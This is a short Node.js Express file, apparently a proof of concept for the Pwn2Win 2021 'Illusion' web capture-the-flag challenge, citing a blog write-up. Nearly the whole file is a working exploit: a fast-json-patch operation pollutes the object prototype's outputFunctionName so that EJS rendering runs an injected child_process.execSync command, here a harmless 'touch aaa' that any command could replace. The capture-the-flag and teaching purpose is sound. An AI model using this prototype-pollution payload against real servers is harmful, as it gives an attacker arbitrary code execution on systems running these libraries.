// https://blog.effectrenan.com/pwn2win-2021-illusion-web-challenge/

const express = require('express')
const jsonpatch = require('fast-json-patch')
const ejs = require('ejs')
const app = express()

let name = {
    who: "kruztw"
}

// Homepage
app.get("/", async (req, res) => {
    let patch = []
    patch.push({
        "op": "replace",
        "path": "/constructor/prototype/outputFunctionName",
        "value": "_; process.mainModule.require('child_process').execSync('touch aaa');//"
    })

    jsonpatch.applyPatch(name, patch)

    const html = await ejs.renderFile(__dirname + "/templates/index.ejs", {name})
    res.end(html)
})


app.listen(8888, () => {
    console.log(`App listening at port 8888`)
})  
